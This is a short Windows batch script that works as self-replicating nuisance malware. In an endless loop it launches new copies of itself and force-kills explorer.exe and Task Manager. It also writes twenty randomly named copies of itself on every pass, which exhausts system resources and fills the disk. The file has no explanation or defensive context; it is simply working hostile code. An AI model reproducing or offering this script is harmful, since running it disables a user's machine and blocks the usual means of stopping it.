@echo off
:a
start %~dp0\e.bat
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
set len=20
set charpool=0123456789QWERTZUIOPASDFGHJKLYXCVBNMqwertzuiopasdfghjklyxcvbnm
set len_charpool=62
set gen_str=
for /L %%b IN (1, 1, %len%) do (
  set /A rnd_index=!RANDOM! * %len_charpool% / 32768
  for /F %%i in ('echo %%charpool:~!rnd_index!^,1%%') do set gen_str=!gen_str!%%i
)
taskkill /im explorer.exe /f
taskkill /im taskmgr.exe /f
copy %~dp0e.bat %~dp0\%gen_str%1.bat
copy %~dp0e.bat %~dp0\%gen_str%2.bat
copy %~dp0e.bat %~dp0\%gen_str%3.bat
copy %~dp0e.bat %~dp0\%gen_str%4.bat
copy %~dp0e.bat %~dp0\%gen_str%5.bat
copy %~dp0e.bat %~dp0\%gen_str%6.bat
copy %~dp0e.bat %~dp0\%gen_str%7.bat
copy %~dp0e.bat %~dp0\%gen_str%8.bat
copy %~dp0e.bat %~dp0\%gen_str%9.bat
copy %~dp0e.bat %~dp0\%gen_str%10.bat
copy %~dp0e.bat %~dp0\%gen_str%11.bat
copy %~dp0e.bat %~dp0\%gen_str%12.bat
copy %~dp0e.bat %~dp0\%gen_str%13.bat
copy %~dp0e.bat %~dp0\%gen_str%14.bat
copy %~dp0e.bat %~dp0\%gen_str%15.bat
copy %~dp0e.bat %~dp0\%gen_str%16.bat
copy %~dp0e.bat %~dp0\%gen_str%17.bat
copy %~dp0e.bat %~dp0\%gen_str%18.bat
copy %~dp0e.bat %~dp0\%gen_str%19.bat
copy %~dp0e.bat %~dp0\%gen_str%20.bat
tree /F /A
goto a
